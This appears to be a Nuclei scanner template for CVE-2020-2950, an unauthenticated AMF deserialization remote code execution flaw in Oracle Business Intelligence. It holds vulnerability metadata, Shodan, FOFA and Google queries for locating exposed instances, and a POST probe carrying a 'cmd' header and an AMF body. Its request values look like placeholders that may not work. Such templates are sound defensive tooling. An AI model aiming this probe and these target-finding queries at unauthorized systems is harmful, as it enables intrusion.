id: CVE-2020-2950

info:
  name: Oracle Business Intelligence Enterprise Edition AMF Deserialization Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Business Intelligence Enterprise Edition.
  impact: |
    Remote code execution
  remediation: |
    Apply the necessary patches provided by Oracle to address CVE-2020-2950.
  reference:
    - https://github.com/tuo4n8/CVE-2020-2950
    - https://peterjson.medium.com/cve-2020-2950-turning-amf-deserialize-bug-to-java-deserialize-bug-2984a8542b6f
    - https://www.zerodayinitiative.com/advisories/ZDI-20-505/
    - https://github.com/CVEDB/PoC-List
    - https://github.com/Mr-xn/Penetration_Testing_POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-2950
    epss-score: 0.84807
    epss-percentile: 0.98621
    cpe: cpe:2.3:a:oracle:business_intelligence:5.5.0.0.0:*:*:*:enterprise:*:*:*
  metadata:
    vendor: oracle
    product: business_intelligence
    shodan-query: http.title:"Oracle Business Intelligence Sign In"
    fofa-query: title="oracle business intelligence sign in"
    google-query: intitle:"oracle business intelligence sign in"

http:
  - method: POST
    path:
      - "{{BaseURL}}/analytics/jbips/messagebroker/cs/"

    headers:
      Content-Type: application/x-amf
      cmd: "{{base64('child !!')}}"

    body: "{{base64('amf.bin')}}"
    matchers:
      - type: word
        words:
          - "AMF3DATA"
        part: body
